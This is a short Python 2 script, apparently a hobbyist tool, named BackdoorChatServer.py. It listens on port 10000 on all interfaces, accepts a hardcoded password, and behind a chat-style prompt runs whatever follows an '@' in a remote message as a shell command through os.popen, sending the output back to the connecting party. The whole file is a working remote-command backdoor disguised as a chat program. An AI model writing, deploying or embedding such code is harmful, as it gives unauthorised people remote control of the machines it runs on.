#!/usr/bin/env python

# Auther        :   Anurodh vishwakarma
# Filename      :   BackdoorChatServer.py



import time
import socket
import os
#import _winreg as winreg

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)

sock.bind(("0.0.0.0",10000))

sock.listen(3)
print "Waiting for a connection ..."
(client,(ip,port)) = sock.accept()
print "Got one connection with "+ip
client.send("Enter Password : ")
pas = client.recv(10)
if pas == 'mrcipher\n':
    client.send("\n"+str(ip)+" You are successfully connected ! \n")

    while 1:
        client.send("\n\nForeigner : ")
        cmd = client.recv(50)
    
        if cmd == 'exit\n':
            break

        else:
            cmd = cmd.split("@") # ex. - hello @ netstat -ano
            print "Foreigner : "+cmd[0]
            if cmd[1] != None:
                output = os.popen(cmd[1],'r',-1)
                o = output.readlines()
                arr = []
                for x in range(len(o)):
                    arr.append(o[x].strip("\n"))
                client.send(str(arr))
            
        msg = raw_input("\nYou : ")
        if msg == 'exit':
            break
        client.send(str(msg))
        
else:
    client.send("You are not an authorize user.")
    time.sleep(2)
    pass

sock.close()

    
